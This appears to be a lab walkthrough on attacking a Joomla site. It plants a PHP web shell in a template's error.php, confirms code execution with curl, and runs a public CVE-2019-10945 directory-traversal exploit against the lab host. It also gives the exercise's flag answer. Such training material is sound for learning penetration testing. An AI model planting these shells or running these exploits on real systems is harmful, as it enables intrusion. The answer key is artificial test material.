# Attacking Joomla
## Abusing Built-In Functionality
Using the credentials that we obtained in the examples from the last section, `admin`:`admin`, let's log in to the target backend at http://dev.inlanefreight.local/administrator.

> If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

```
http://dev.inlanefreight.local/administrator/index.php
```
From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.

```
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```
Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

```sh
$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Questions
1. Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application **Answer: j00mla_c0re_d1rtrav3rsal!**
   - Pull PoC for CVE-2019-10945:
        ```sh
        $ wget https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py
        ```
   - Run the exploit with `admin`:`admin` credential:
        ```sh
        $ python CVE-2019-10945.py --url http://dev.inlanefreight.local/administrator/ --username admin --password admin
        /home/htb-ac-1863259/CVE-2019-10945.py:52: SyntaxWarning: invalid escape sequence '\ '
        | |  | |   /\   |  _ \ / __ \ / __ \|  _ \
        
        # Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
        # Web Site: Haboob.sa
        # Email: research@haboob.sa
        # Versions: Joomla 1.5.0 through Joomla 3.9.4
        # https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
        _    _          ____   ____   ____  ____  
        | |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
        | |__| |  /  \  | |_) | |  | | |  | | |_) |
        |  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
        | |  | |/ ____ \| |_) | |__| | |__| | |_) |
        |_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                            


        administrator
        bin
        cache
        cli
        components
        images
        includes
        language
        layouts
        libraries
        media
        modules
        plugins
        templates
        tmp
        LICENSE.txt
        README.txt
        configuration.php
        flag_6470e394cbf6dab6a91682cc8585059b.txt
        htaccess.txt
        index.php
        robots.txt
        web.config.txt
        ```
   - Read the flag at webroot: http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt